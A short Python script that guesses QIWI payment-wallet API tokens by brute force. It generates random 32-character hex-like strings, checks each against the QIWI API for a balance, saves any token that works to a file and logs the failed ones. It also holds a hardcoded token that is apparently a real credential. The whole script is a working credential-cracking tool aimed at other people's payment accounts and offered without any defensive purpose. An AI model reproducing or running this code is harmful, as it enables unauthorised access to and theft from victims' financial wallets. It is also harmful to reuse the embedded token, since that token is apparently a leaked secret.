import random
from random import randint
from SimpleQIWI import *
import time
from time import sleep
import os
import requests
def start():
    x=0
    phone=''
    m=32
    suc=requests.get('https://vk.com')
    print(suc)
    if suc.status_code==200:
        while True:
            x+=1
            time.sleep(0.2)
            token=(''.join([random.choice(list('91a2b73c4ac8bbe5f60ef')) for x in range(32)]))
            try:
                api=QApi(token=token,phone=phone)
                if api.balance[0]>=0:
                    print(api.balance[0])
                    print('SUCESFULL - ТОКЕН НАЙДЕН\n',token)
                    f=open("suc_full.txt", 'w')
                    f.write(token)
                    f.close()
                    break
            except:
                print('[-]',token)
                l=open(u"asces_token.txt", 'a')
                l.write(token+'\n')
                l.close()
            if x>99:
                token='6e92bafbd540c864cf1926a58c759f19'
                api=QApi(token=token,phone=phone)
                if api.balance[0]>=0:
                    print(api.balance[0])
                    print('SUCESFULL [++++]')
                    start()
    else:
        print('жепа')
try:
    start()
except:
    time.sleep(100)
    start()